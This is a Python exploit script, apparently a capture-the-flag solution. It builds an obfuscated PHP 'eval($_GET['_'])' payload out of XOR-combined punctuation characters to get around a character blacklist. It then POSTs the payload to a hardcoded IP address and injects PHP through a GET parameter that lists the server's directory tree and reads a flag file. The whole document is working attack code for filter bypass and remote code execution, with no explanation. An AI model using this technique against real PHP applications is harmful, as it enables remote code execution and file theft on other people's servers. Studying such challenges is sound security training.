import string,requests
def blacklist_payload(strings=""):
    blacklist = {'!':"('}'^'\\')","@":"('}'^'=')","[":"('`'^';')","]":"('`'^'=')","|":"('_'^'#')"} 
    for i in strings:
        if i in blacklist.keys():
            strings = strings.replace(i,blacklist[i]).replace(")'",")").replace("'(","(")
            
    return strings

def create_payload(strings=b"",mode=0):
    all_key = b"&|\\\"#$%'()*+,-./:;<=>?^_{}`"    
    if mode == 1:
        all_key = b"@\"|[]!#$%&\'()*+,-./:;<=>?\^_{}`"
    gets = ""
    keys = ""
    result = {}

    for i in strings:
        if i == ord("'"):            
            result[chr(i)] ="'\''"
            continue
        if i in [ord(q) for q in "&|\\\"#$%()*+,-./:;<=>?^_{}`"]:
            result[chr(i)] = "'" + chr(i) + "'"
            continue
        for j in all_key: 
            for z in all_key:
                if z^j == i:                
                    gets += chr(j)  
                    keys += chr(z)                    
                    result[chr(i)] = ".".join(["('"+ gets[i] + "'" + f"^'{keys[i]}')" for i in range(len(gets))])          
                    gets = ""
                    keys = ""
                    break
    
    payloads = []
    for i in strings:       
        try:
            payloads.append(result[chr(i)])
    
        except KeyError as e:      
            if str(e).replace("'","") in [')','(',';','+','/','*',',','-','.',':',"'"]:
                payloads.append(str(e))
                continue            
            get_blacklist_payload = create_payload(str(e).replace("'","").encode(),1)
            payloads.append(blacklist_payload(get_blacklist_payload))

    return ".".join(payloads).replace("'''","'\\''").replace("('{'^'\\')","'\\''")

payload_post = create_payload(b"eval($_GET['_'])")
def read_flag(url):
    payload_get = "?_= echo gzread(gzopen('z1n1_flagnya_om_slashr00t_5.txt','r'),1024);"
    return requests.post(url+payload_get,data={"e":payload_post}).text
def get_dir_list(url):
    payload_get = "?_=$a=new RecursiveIteratorIterator(new RecursiveDirectoryIterator('.'));$a->rewind();print_r(iterator_to_array($a));"    
    return requests.post(url+payload_get,data={"e":payload_post}).text

print(get_dir_list("http://103.145.226.170:3034/index.php"))
print(read_flag("http://103.145.226.170:3034/"))